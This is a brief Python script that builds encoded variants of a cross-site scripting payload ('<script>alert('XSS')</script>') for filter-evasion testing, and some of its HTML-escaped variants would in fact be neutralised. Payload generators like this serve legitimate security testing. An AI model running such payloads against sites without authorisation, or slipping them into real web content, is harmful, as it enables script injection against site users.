import urllib.parse
import html

def generate_xss_payloads(base_payload):

    payload_variations = []

    url_encoded_payload = urllib.parse.quote(base_payload)
    payload_variations.append(url_encoded_payload)

    double_encoded_payload = urllib.parse.quote(url_encoded_payload)
    payload_variations.append(double_encoded_payload)

    html_encoded_payload = html.escape(base_payload)
    payload_variations.append(html_encoded_payload)

    left_angle_bracket_payload = base_payload.replace('<', '&lt;')
    right_angle_bracket_payload = base_payload.replace('>', '&gt;')
    payload_variations.append(left_angle_bracket_payload)
    payload_variations.append(right_angle_bracket_payload)

    for payload in payload_variations:
        print(payload)

generate_xss_payloads("<script>alert('XSS')</script>")
